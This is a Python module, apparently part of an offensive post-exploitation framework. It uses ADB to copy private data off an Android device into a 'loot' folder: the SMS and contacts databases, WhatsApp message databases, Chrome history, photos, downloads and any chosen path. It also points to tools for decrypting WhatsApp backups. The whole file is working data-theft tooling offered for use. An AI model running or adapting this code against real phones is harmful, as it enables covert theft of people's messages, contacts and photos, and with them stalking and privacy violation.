import subprocess
import os
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(device_id, *args):
    cmd = ['adb', '-s', device_id] + list(args)
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout.strip(), r.stderr.strip()

def _shell(device_id, cmd):
    out, _ = _adb(device_id, 'shell', cmd)
    return out

class Module:
    MODULE_INFO = {
        'name': 'post/android_exfil',
        'description': 'Exfiltrate files from Android device via ADB pull: SMS, contacts, WhatsApp, photos, browser history.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'OUTPUT_DIR': 'Local directory to save pulled files [default: loot/android_exfil/]',
            'PULL_SMS': 'Pull SMS database [default: true]',
            'PULL_CONTACTS': 'Pull contacts database [default: true]',
            'PULL_WHATSAPP': 'Pull WhatsApp message database [default: true]',
            'PULL_PHOTOS': 'Pull DCIM/Camera photos [default: false]',
            'PULL_DOWNLOADS': 'Pull Downloads folder [default: false]',
            'PULL_BROWSER': 'Pull Chrome/browser history [default: true]',
            'CUSTOM_PATH': 'Pull a specific remote path (optional)',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _pull(self, device_id, remote_path, local_path, label):
        Path(local_path).parent.mkdir(parents=True, exist_ok=True)
        out, err = _adb(device_id, 'pull', remote_path, local_path)
        if 'error' in err.lower() or 'permission denied' in err.lower():
            console.print(f"  [red][!] {label}: {err[:80]}[/red]")
            return False
        console.print(f"  [green][+] {label} → {local_path}[/green]")
        log_action(f"Pulled {remote_path} from {device_id} → {local_path}")
        return True

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        out_dir = self.framework.options.get('OUTPUT_DIR', 'loot/android_exfil')
        pull_sms = self.framework.options.get('PULL_SMS', 'true').lower() == 'true'
        pull_contacts = self.framework.options.get('PULL_CONTACTS', 'true').lower() == 'true'
        pull_wa = self.framework.options.get('PULL_WHATSAPP', 'true').lower() == 'true'
        pull_photos = self.framework.options.get('PULL_PHOTOS', 'false').lower() == 'true'
        pull_dl = self.framework.options.get('PULL_DOWNLOADS', 'false').lower() == 'true'
        pull_browser = self.framework.options.get('PULL_BROWSER', 'true').lower() == 'true'
        custom_path = self.framework.options.get('CUSTOM_PATH', '')

        if not device_id:
            console.print("[red][!] DEVICE_ID is required.[/red]")
            return

        Path(out_dir).mkdir(parents=True, exist_ok=True)
        console.print(f"[cyan][*] Android exfiltration from {device_id} → {out_dir}[/cyan]")
        console.print("[yellow][!] Some paths require root access on the device.[/yellow]\n")
        log_action(f"Android exfil started on {device_id}")

        targets = []

        if pull_sms:
            targets += [
                ('/data/data/com.android.providers.telephony/databases/mmssms.db',
                 f'{out_dir}/sms/mmssms.db', 'SMS Database'),
            ]

        if pull_contacts:
            targets += [
                ('/data/data/com.android.providers.contacts/databases/contacts2.db',
                 f'{out_dir}/contacts/contacts2.db', 'Contacts Database'),
            ]

        if pull_wa:
            targets += [
                ('/sdcard/WhatsApp/Databases/msgstore.db.crypt15',
                 f'{out_dir}/whatsapp/msgstore.db.crypt15', 'WhatsApp DB (crypt15)'),
                ('/sdcard/WhatsApp/Databases/msgstore.db',
                 f'{out_dir}/whatsapp/msgstore.db', 'WhatsApp DB (plain)'),
                ('/data/data/com.whatsapp/databases/msgstore.db',
                 f'{out_dir}/whatsapp/msgstore_root.db', 'WhatsApp DB (root path)'),
            ]

        if pull_browser:
            targets += [
                ('/data/data/com.android.chrome/app_chrome/Default/History',
                 f'{out_dir}/browser/chrome_history', 'Chrome History'),
                ('/data/data/com.android.browser/databases/browser2.db',
                 f'{out_dir}/browser/browser2.db', 'Browser DB'),
            ]

        if pull_photos:
            console.print(f"[cyan][*] Pulling photos (this may take a while)...[/cyan]")
            self._pull(device_id, '/sdcard/DCIM/Camera/', f'{out_dir}/photos/', 'DCIM Camera')

        if pull_dl:
            self._pull(device_id, '/sdcard/Download/', f'{out_dir}/downloads/', 'Downloads folder')

        for remote, local, label in targets:
            self._pull(device_id, remote, local, label)

        if custom_path:
            local_name = os.path.basename(custom_path.rstrip('/'))
            self._pull(device_id, custom_path, f'{out_dir}/custom/{local_name}', f'Custom: {custom_path}')

        # Show what was actually saved
        saved = sum(1 for p in Path(out_dir).rglob('*') if p.is_file())
        console.print(f"\n[bold green][+] Exfiltration complete. {saved} file(s) saved to {out_dir}[/bold green]")
        if pull_wa:
            console.print("[dim][*] WhatsApp crypt15 files: use 'whatsapp-viewer' or 'WhatsDump' to decrypt.[/dim]")
